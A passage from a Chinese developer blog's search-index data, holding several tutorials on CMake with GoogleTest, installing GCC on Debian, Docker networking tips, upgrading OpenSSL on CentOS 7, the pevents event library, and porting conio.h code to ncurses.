GoogleTest 库 1234567891011121314151617181920212223242526272829303132333435363738394041cmake_minimum_required(VERSION 3.15)# 项目信息project(minder_test)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 查找 GoogleTest 库find_package(GTest REQUIRED)# 显示 GoogleTest 库的路径MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES})# 搜索父目录（父项目）的头文件include_directories(../include)# 搜索父目录（父项目）的源文件aux_source_directory(../src MAIN_SOURCES)# 排除父目录（父项目）的入口源文件list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# 引入子项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索子项目里的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# 引入 GoogleTest 的头文件include_directories(${GTEST_INCLUDE_DIRS})# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的名称和单元测试的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES})# 链接 GoogleTest 与 pthread 库（请特别注意声明的顺序）target_link_libraries(${PROJECT_NAME} ${GTEST_BOTH_LIBRARIES} pthread) 命令行编译项目 编译 test 子项目 1234567891011121314151617# 进入子项目的目录$ cd minder-gtest/test# 创建子项目的构建目录$ mkdir build# 进入子项目的构建目录$ cd build# 构建子项目$ cmake ..# 编译子项目$ make# 运行可执行文件$ ./minder_test 运行可执行文件后，输出的日志信息如下： 123456789101112[==========] Running 2 tests from 1 test suite.[----------] Global test environment set-up.[----------] 2 tests from TestCase[ RUN ] TestCase.test1[ OK ] TestCase.test1 (0 ms)[ RUN ] TestCase.test2[ OK ] TestCase.test2 (0 ms)[----------] 2 tests from TestCase (0 ms total)[----------] Global test environment tear-down[==========] 2 tests from 1 test suite ran. (2 ms total)[ PASSED ] 2 tests. 编译主项目 1234567891011121314151617181920# 进入主项目的目录$ cd minder-gtest# 创建主项目的构建目录$ mkdir build# 进入主项目的构建目录$ cd build# 构建主项目$ cmake ..# 编译主项目$ make# 执行项目测试$ make test# 运行可执行文件$ ./minder GoogleTest 使用扩展说明在上面的案例中，GoogleTest 是使用源码编译的方式安装到 Linux 系统上的，这在迁移操作系统的时候，需要重复执行同样的安装步骤。此时为了方便日后迁移操作系统，可以将 GoogleTest 的头文件、动态链接都复制一份到项目中，这样就可以不依赖外部的系统环境了。 提示 点击下载 完整的案例代码，项目的目录结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778minder-gtest-plus├── CMakeLists.txt├── include│ └── datetime.h├── src│ ├── datetime.cpp│ └── main.cpp├── test│ ├── CMakeLists.txt│ ├── include│ │ └── strUtil.h│ └── src│ └── main.cpp└── thirdparty └── googletest ├── gmock │ ├── include │ │ └── gmock │ │ ├── gmock-actions.h │ │ ├── gmock-cardinalities.h │ │ ├── gmock-function-mocker.h │ │ ├── gmock-generated-actions.h │ │ ├── gmock-generated-actions.h.pump │ │ ├── gmock-generated-function-mockers.h │ │ ├── gmock-generated-function-mockers.h.pump │ │ ├── gmock-generated-matchers.h │ │ ├── gmock-generated-matchers.h.pump │ │ ├── gmock.h │ │ ├── gmock-matchers.h │ │ ├── gmock-more-actions.h │ │ ├── gmock-more-matchers.h │ │ ├── gmock-nice-strict.h │ │ ├── gmock-spec-builders.h │ │ └── internal │ │ ├── custom │ │ │ ├── gmock-generated-actions.h │ │ │ ├── gmock-generated-actions.h.pump │ │ │ ├── gmock-matchers.h │ │ │ ├── gmock-port.h │ │ │ └── README.md │ │ ├── gmock-internal-utils.h │ │ ├── gmock-port.h │ │ └── gmock-pp.h │ └── lib │ ├── libgmock_main.so │ └── libgmock.so └── gtest ├── include │ └── gtest │ ├── gtest-death-test.h │ ├── gtest.h │ ├── gtest-matchers.h │ ├── gtest-message.h │ ├── gtest-param-test.h │ ├── gtest_pred_impl.h │ ├── gtest-printers.h │ ├── gtest_prod.h │ ├── gtest-spi.h │ ├── gtest-test-part.h │ ├── gtest-typed-test.h │ └── internal │ ├── custom │ │ ├── gtest.h │ │ ├── gtest-port.h │ │ ├── gtest-printers.h │ │ └── README.md │ ├── gtest-death-test-internal.h │ ├── gtest-filepath.h │ ├── gtest-internal.h │ ├── gtest-param-util.h │ ├── gtest-port-arch.h │ ├── gtest-port.h │ ├── gtest-string.h │ ├── gtest-type-util.h │ └── gtest-type-util.h.pump └── lib ├── libgtest_main.so └── libgtest.so test 目录的 CMakeLists.txt，这里的配置内容使用了项目里的 GoogleTest 库 1234567891011121314151617181920212223242526272829303132333435363738394041cmake_minimum_required(VERSION 3.15)# 定义 GoogleTest 库的目录路径set(PATH_TO_GOOGLE_TEST ../thirdparty/googletest/gtest)set(PATH_TO_GOOGLE_MOCK ../thirdparty/googletest/gmock)# 项目信息project(minder_test)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 搜索父目录（父项目）的头文件include_directories(../include)# 搜索父目录（父项目）的源文件aux_source_directory(../src MAIN_SOURCES)# 排除父目录（父项目）的入口源文件list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# 引入子项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索子项目里的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# 引入 GoogleTest 库的头文件include_directories(${PATH_TO_GOOGLE_TEST}/include ${PATH_TO_GOOGLE_MOCK}/include)# 指定 GoogleTest 动态链接库所在的目录link_directories(${PATH_TO_GOOGLE_TEST}/lib ${PATH_TO_GOOGLE_MOCK}/lib)# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的名称和单元测试的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES})# 链接 GoogleTest 与 pthread 库（请特别注意声明的顺序）target_link_libraries(${PROJECT_NAME} gtest_main.so gtest.so gmock_main.so gmock.so pthread) main.cpp 的 C++ 代码，与上面的案例代码完全一致 1234567891011121314151617181920212223#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"#include &lt;gtest/gtest.h&gt;using namespace std;// 去除字符串两边的空格TEST(TestCase, test1) { string str = " Hello World ! "; trim(str); ASSERT_EQ("Hello World !", str);}// 根据给定的日期，计算它是星期几TEST(TestCase, test2) { ASSERT_EQ(true, DateUtil::isWeekendDays("2022-01-09"));}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} 参考博客 建立简单的带单元测试的 CMake 项目 CMake + GoogleTest 之一入门 CMake 使用 GoogleTest 进行单元测试 Centos7 C++ 安装使用 GoogleTest 进行单元测试 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ linux系统编程 c语言"},{title:"Debian 安装 GCC、G++、GDB",url:"/posts/7df04100.html",text:'提示 GCC 4.8.1，这是该编译器由 C 实现转向 C++ 实现（4.8 版本）后的首次升级，也是第一个实现 C++ 11 所有语言特性的编译器。 Debian 8 Jessie 更改仓库源 123456# 备份配置文件# cp /etc/apt/sources.list /etc/apt/sources.list.bak# 更改仓库源# echo "deb http://ftp.us.debian.org/debian/ jessie main contrib non-free" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://ftp.us.debian.org/debian/ jessie main contrib non-free" &gt;&gt; /etc/apt/sources.list 安装 GCC、G++、GDB 123456# 安装软件（最后得到的版本是4.8.4）# apt-get install -y gcc-4.8 g++-4.8 gdb# 建立软链接（可选）# ln -s /usr/bin/gcc-4.8 /usr/bin/gcc# ln -s /usr/bin/g++-4.8 /usr/bin/g++ Debian 9 Stretch提示 build-essential 指的是编译程序必需的软件包，包含了 GCC、G++、Make 等工具 在 Debian 9 Stretch 上安装 build-essential 后，得到的 GCC、G++ 的版本是 6.3.0 若希望在 Debian 9 Stretch 上安装低版本的 GCC/G++（例如 4.8），那么可以将上面 Debian 8 Jessie 的仓库源地址添加到 Debian 9 Stretch 系统里，然后使用同样的方法分别单独安装 GCC/G++ 更改仓库源 123456789101112# 备份配置文件# cp /etc/apt/sources.list /etc/apt/sources.list.bak# 更改仓库源# echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.list 安装 GCC、G++、GDB 1# apt-get install -y build-essential gdb 参考博客 Debian 9 安装 gcc-4.8 如何在 Debian Stretch 上安装 gcc-4.8 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"debian/ubuntu"},{title:"Docker 开发随笔",url:"/posts/abd1f0ff.html",text:"Docker 删除所有 none 镜像1# docker rmi `docker images | grep '&lt;none&gt;' | awk '{print $3}'` Docker 构建镜像时忽略错误信息根据 Dockerfile 构建镜像，当构建失败时，往往会出现以下错误： 12automake: error: no 'Makefile.am' found for any configure outputError build: The command [/bin/sh -c aclocal &amp;&amp; autoconf &amp;&amp; automake -a] returned a non-zero code: 1 在很多企业的应用场景里，上面的错误信息实际上是无害的，可以忽略不处理。但一旦出现此类错误 Docker 就会停止构建，此时如果需要让 Docker 忽略类似的错误信息，可以使用 exit 0 1RUN make 当 Dockerfile 里包含了上面类似的指令，则可以改写为以下的内容，这将始终返回 0（成功）退出代码，此时 Docker 不会意外终止构建过程 1RUN make; exit 0 不同网段之间的容器实现互相通信Docker 命令行的使用提示 假设存在两个容器，分别是 Redis 容器（172.89.0.2）和 Nginx 容器（172.89.0.5），两者具体的 docker-compose.yml 配置信息如下： Redis 容器 123456789101112131415161718192021222324252627version: '3.5'services: redis: image: redis:5.0.4-stretch container_name: redis restart: always privileged: false environment: TZ: 'Asia/Shanghai' ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - '/usr/local/redis/data:/data' - '/usr/local/redis/redis.conf:/usr/local/etc/redis/redis.conf' command: redis-server /usr/local/etc/redis/redis.confnetworks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Nginx 容器 1234567891011121314151617181920212223242526version: '3.5'services: nginx: image: nginx:1.20 container_name: nginx restart: always privileged: false environment: TZ: 'Asia/Shanghai' networks: nginx-network: ipv4_address: 172.64.0.5 ports: - 80:80 - 443:443 volumes: - '/usr/local/nginx/conf/nginx.conf:/usr/local/nginx/conf/nginx.conf'networks: nginx-network: name: nginx-network driver: bridge ipam: config: - subnet: 172.64.0.0/24 上述的 Redis 和 Nginx 容器分别处于不同的网段中，两者之间的网络无法直接 Ping 得通；若希望在 Redis 内可以 Ping 通 Nginx 容器，那么可以将 Nginx 容器添加到 Redis 容器所在网络里，命令示例如下： 12345678# 将Nginx容器添加到Redis容器所在网络里# docker network connect redis-network nginx# 查看Nginx容器在Redis容器所在网络里的IP# docker network inspect redis-network# 在Redis容器内直接Ping通Nginx容器（这里的IP是Nginx容器在新网络里的IP地址）# ping 172.89.0.3 警告 使用 docker network connect redis-network nginx 命令，将 Nginx 容器添加到 Redis 容器所在网络后，Nginx 在新网络里的 IP 地址是不固定的，例如 Docker 服务重启后 IP 地址会变更，这一点必须注意！ 将 Nginx 容器从 Redis 容器所在网络里移除掉，可以使用以下命令： 1# docker network disconnect redis-network nginx 提示 Docker 默认网络的名称是 bridge，默认情况下创建的所有容器都会在 bridge 网络内。 12345# 查看Docker的所有网络# docker network ls# 查看某网络下所有容器的信息（包括各个容器的IP）# docker network inspect redis-network Docker-Compose 的使用在 Docker-Compose 中，支持将 Nginx 容器添加到 Redis 容器所在网络里，配置示例如下所示。 提示 值得一提的是，这里通过 docker-compose.yml 配置文件，将 Nginx 容器添加到 Redis 容器所在网络后，Nginx 在新网络里的 IP 地址是固定的。 Redis 容器，配置内容和上面的案例一致 123456789101112131415161718192021222324252627version: '3.5'services: redis: image: redis:5.0.4-stretch container_name: redis restart: always privileged: false environment: TZ: 'Asia/Shanghai' ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - '/usr/local/redis/data:/data' - '/usr/local/redis/redis.conf:/usr/local/etc/redis/redis.conf' command: redis-server /usr/local/etc/redis/redis.confnetworks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Nginx 容器，配置了多个网络，同时指定了容器在不同网络下的 IP 地址 12345678910111213141516171819202122232425262728293031323334version: '3.5'services: nginx: image: nginx:1.20 container_name: nginx restart: always privileged: false environment: TZ: 'Asia/Shanghai' networks: nginx-network: ipv4_address: 172.64.0.5 redis-network: ipv4_address: 172.89.0.3 ports: - 80:80 - 443:443 volumes: - '/usr/local/nginx/conf/nginx.conf:/usr/local/nginx/conf/nginx.conf'networks: nginx-network: name: nginx-network driver: bridge ipam: config: - subnet: 172.64.0.0/24 redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 查看 Docker 的网络状况 12345# 查看Nginx容器在Redis容器所在网络里的IP# docker network inspect redis-network# 在Redis容器内直接Ping通Nginx容器# ping 172.89.0.3 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"容器化 开发随笔"},{title:"Centos7 升级 OpenSSL",url:"/posts/4ffdb5e1.html",text:'系统环境1Linux clay 3.10.0-1160.49.1.el7.x86_64 #1 SMP Tue Nov 30 15:51:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 升级 OpenSSL 查看 OpenSSL 的版本 12# openssl versionOpenSSL 1.0.2k-fips 26 Jan 2017 备份旧版的 OpenSSL 12# mv /usr/bin/openssl /usr/bin/openssl.bak# mv /usr/include/openssl /usr/include/openssl-bak 安装依赖 1# yum install -y perl perl-devel perl-Test-Simple gcc gcc-c++ make 编译安装 注意事项 建议从 OpenSSL 官网 下载源码包，最新的稳定版本是 1.1.1 系列 ./config 命令必须加上 shared 参数，否则生成的 lib 目录里面只有 .a 静态库文件， 没有 .so 动态链接库文件 123456789101112131415161718192021222324252627# 下载文件# wget https://www.openssl.org/source/openssl-1.1.1m.tar.gz# 解压文件# tar -xvf openssl-1.1.1m.tar.gz# 进入解压目录# cd openssl-1.1.1m# 构建配置# ./config shared zlib --prefix=/usr/local/openssl# 编译# make -j4# 安装# make install# 添加动态链接库的路径到系统配置文件# echo "/usr/local/openssl/lib" &gt;&gt; /etc/ld.so.conf# 使配置生效# ldconfig -v# 链接文件# ln -sf /usr/local/openssl/bin/openssl /usr/bin/openssl# ln -sf /usr/local/openssl/include/openssl /usr/include/openssl 验证是否升级成功 12# openssl versionOpenSSL 1.1.1m 14 Dec 2021 升级后的维护更新 OpenSSL 后，需要排查系统的第三方服务是否以静态编译方式使用了 OpenSSL；如果第三方服务是静态编译的，则需要指定新的 OpenSSL 库重新进行编译，否则会影响服务的正常运行或者容易让其受到安全攻击。 提示 一般以静态编译方式使用了 OpenSSL 的第三方服务有：OpenSSH、Nginx、Apache，尤其当 Web 服务器支持 HTTPS 协议的时候 参考博客 Ubuntu16.04.4 升级 OpenSSL Centos8 OpenSSL 升级版本到最新 CentOS 如何升级 OpenSSL 到最新版本 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Linux 实现 Windows 的 Event 事件机制",url:"/posts/c847598e.html",text:'前言 Linux 中没有 Windows 系统中的 CreateEvent()、WaitEvent()、SetEvent()、ResetEvent() 等函数，本文将介绍如何使用 pevents 替代 Linux 缺失的函数。 pevents 介绍 pevents 的简介pevents 是一个跨平台的轻量级 C++ 库，旨在为 POSIX 系统提供 WIN32 事件的实现。pevents 提供了 Windows 平台手动和自动重置事件的大部分功能，最显著的是支持同时等待多个事件（WaitForMultipleObjects），而且支持 Windows、FreeBSD、Linux、macOS、iOS、Android 等平台。 pevents 的 APIAPI 函数pevents 的 API 是根据 Windows 的 CreateEvent（）、WaitEvent（） 和 WaitForMultipleObjects（） 函数编写的，熟悉 WIN32 事件的开发人员应该可以将代码库切换到 pevents API。虚假唤醒是 Linux 下系统编程的正常部分，也是来自 Windows 世界的开发人员的常见陷阱，pevents 可以保证不存在虚假唤醒和等待返回的数据的正确性，其提供了如下的 API： 12345678910int SetEvent(neosmart_event_t event);int ResetEvent(neosmart_event_t event);int PulseEvent(neosmart_event_t event);int DestroyEvent(neosmart_event_t event);neosmart_event_t CreateEvent(bool manualReset, bool initialState);int WaitForEvent(neosmart_event_t event, uint64_t milliseconds);int WaitForMultipleEvents(neosmart_event_t *events, int count, bool waitAll, uint64_t milliseconds);int WaitForMultipleEvents(neosmart_event_t *events, int count, bool waitAll, uint64_t milliseconds, int &amp;index); 事件状态的类型 CreateEvent() 函数 1234567neosmart_event_t CreateEvent( // true：表示手动，在 WaitEvent 后需要手动调用 ResetEvent 清除事件信号。false：表示自动，在 WaitEvent 后，系统会自动清除事件信号 bool manualReset, // 初始状态，false 为无信号，true 为有信号 bool initialState); WaitForEvent() 函数 123456int WaitForEvent( // 句柄对象 neosmart_event_t event, // 等待的时间（毫秒） uint64_t milliseconds); 事件状态的类型 WAIT_TIMEOUT：等待超时 WAIT_OBJECT_0：句柄对象处于有信号状态 WAIT_FAILED：出现错误，可通过 GetLastError() 函数得到错误码 WAIT_ABANDONED：说明句柄代表的对象是个互斥对象，并且正在被其它线程占用 warning在 Linux 平台，pevents 的事件状态只支持使用 WAIT_TIMEOUT，且有信号的时候 WaitEvent() 函数的返回值是 0，而在 Windows 平台则支持上述四种事件状态 pevents 的项目结构 核心代码在 src/ 目录 单元测试代码（通过 Meson 构建）在 test/ 目录 在 examples/ 目录中可以找到演示 pevents 用法的跨平台应用示例程序 pevents 的编译构建pevents 使用的构建工具是 Meson，目前这仅用于支持 pevents 核心代码及其单元测试的自动化构建 / 测试。值得一提的是，开发人员不需要担心构建工具的差异性，pevents 是特意基于 C/C++ 标准编写的，避免了复杂的配置或依赖于平台的构建指令的需要。 pevents 的编译参数通过编译参数 -DWFMO 与 -DPULSE，可以在编译时让 pevents 启用不同的功能： WFMO：启用 WFMO 功能，如果需要使用 WaitForMultipleEvents() 函数，建议仅使用 WFMO 进行编译，因为它会为所有事件对象增加开销（较小）。 PULSE：启用 PulseEvent 功能，PulseEvent() 在 Windows 平台从根本上被破坏了，一般不应该被使用，当你调用它时，它几乎永远不会做你认为你正在做的事情。pevents 包含这个函数只是为了让现有的（有缺陷的）代码从 WIN32 移植到 Unix/Linux 平台更容易，并且这个函数默认没有编译到 pevents 中。 Meson 指定编译参数在 Meson 中，可以通过 meson_options.txt 配置文件指定编译参数，让 pevents 启用不同的功能 1234option(\'wfmo\', type: \'boolean\', value: true, description: \'Enable WFMO events\')option(\'pulse\', type: \'boolean\', value: false, description: \'Enable PulseEvent() function\') CMake 指定编译参数在 CMake 中，可以通过 CMakeLists.txt 配置文件指定编译参数，让 pevents 启用不同的功能 1set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread -DWFMO") pevents 运行示例代码note值得一提的是，pevents 的核心 C++ 源文件是 pevents.h、pevents.cpp 1234567891011121314151617# 拉取代码$ git clone git@github.com:clay-world/pevents.git# 进入源码目录$ cd pevents# 生成构建的输出目录$ meson build# 进入构建的输出目录$ cd build# 编译代码$ ninja# 运行示例程序$ ./sample pevents 的实战案例编译说明下面给出的案例使用了 pthread，由于 pthread 不是 Linux 系统默认的库，因此链接时需要使用静态库 libpthread.a。简而言之，在使用 pthread_create() 创建线程，以及调用 pthread_atfork() 函数建立 fork 处理程序时，需要通过 -lpthread 参数链接该库，同时还需要在 C++ 源文件里添加头文件 pthread.h。 提示 为了可以正常编译使用了 pthread 的项目代码，不同构建工具的使用说明如下： 若使用 G++ 编译 C++ 项目，则编译命令的示例如下： 12# 编译代码$ g++ main.cpp -o main -lpthread 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下： 123set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread -DWFMO")add_executable(main main.cpp) 实战案例一CreateEvent(true, true) - 手动清除事件信号，初始状态为有信号，点击下载 基于 CMake 构建的完整案例代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}int main() { // 手动清除事件信号，初始状态为有信号 g_hEvent = CreateEvent(true, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);} 程序运行的结果如下： 1234thread-1 pid 62705 tid 2336241408 (0x8b403700)thread-1 is working...thread-2 pid 62705 tid 2327848704 (0x8ac02700)thread-2 is working... note可以看到线程 1 和线程 2 都完整执行了，这是因为创建的事件是需手动 Reset 才会变为无信号的，所以执行完线程 1 后事件仍处于有信号的状态，所以线程 2 的逻辑才会被继续执行。 实战案例二CreateEvent(false, true) - 自动清除事件信号，且初始状态为有信号，点击下载 基于 CMake 构建的完整案例代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}int main() { // 自动清除事件信号，初始状态为有信号 g_hEvent = CreateEvent(false, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);} 程序运行的结果如下： 123thread-1 pid 59685 tid 2245932800 (0x85de3700)thread-1 is working...thread-2 pid 59685 tid 2237540096 (0x855e2700) note可以看到只有线程 1 完整执行了，这是由于事件在执行完线程 1 后被系统自动重置为无信号，所以线程 2 中的逻辑没有被执行。 实战案例三CreateEvent(true, false) - 手动清除事件信号，初始状态为无信号，包括 SetEvent（） 与 ResetEvent() 的使用，点击下载 基于 CMake 构建的完整案例代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } // 重置事件为无信号 ResetEvent(g_hEvent); return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}void func1() { // 手动清除事件信号，初始状态为有信号 g_hEvent = CreateEvent(true, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);}int main() { // 手动清除事件信号，初始状态为无信号 g_hEvent = CreateEvent(true, false); // 设置事件为有信号 SetEvent(g_hEvent); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5); return 0;} 程序运行的结果如下： 123thread-1 pid 70368 tid 2745513728 (0xa3a53700)thread-1 is working...thread-2 pid 70368 tid 2737121024 (0xa3252700) note可以看到只有线程 1 完整执行了，这是因为线程 1 在执行之前事件是有信号的，执行完成后事件被手动重置为无信号，所以线程 2 中的逻辑没有被执行。 参考资料 C++ 的 CreateEvent () WaitForSingleObject 和 WaitForMultipleObject 事件 SetEvent、ResetEvent、WaitForSingleObject 与 CreateEvent 详解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ linux系统编程"},{title:"Linux 移植 Windows 的 C++ 代码",url:"/posts/15f45d12.html",text:'conio.h 头文件移植简述conio.h 不是 C 标准库中的头文件，在 ISO 和 POSIX 标准中均没有定义。conio 是 Console Input/Output（控制台输入输出）的简写，其中定义了通过控制台进行数据输入和数据输出的函数，主要是一些用户通过按键盘产生的对应操作，比如 getch() 函数等等。大部分 DOS、Windows、Phar Lap、DOSX，OS/2 等平台上的 C 编译器提供了此头文件，UNIX 和 Linux 平台的 C 编译器本身通常不包含此头文件。另外在项目开发中，平时主要是使用 conio.h 这个头文件中的 getch() 函数，即读取键盘字符但是不显示出来（without echo)，但是含有 conio.h 的代码在 Linux 下无法直接编译通过，因为 Linux 没有这个头文件。但 Linux 平台下完全可以使用 ncurses 替代 conio.h 头文件，ncurses 支持的 API 可以阅读 官方文档。值得一提的是，ncurses 在 Linux 平台实现了 getch()、scanw()、getstr() 等函数。 安装依赖提示 由于 ncurses 不是 Linux 系统默认的库，因此需要安装后才能使用，不同平台的安装命令如下： CentOS/Fedora 1# yum install -y ncurses ncurses-devel Debian/Ubuntu 1# apt-get install -y libncurses5-dev libncursesw5-dev 案例代码提示 ncurses.h 与 curses.h 这两个头文件是等价的 12345678910#include &lt;iostream&gt;#include &lt;ncurses.h&gt;using namespace std;int main() { cout &lt;&lt; ("Hello Wolrd!") &lt;&lt; endl; getch(); return 0;} 编译说明由于 ncurses 不是 Linux 系统默认的库，因此编译时需要链接到该库，同时还需要在 C++ 的源文件里添加头文件 ncurses.h，否则编译会失败。 提示 为了可以正常编译使用了 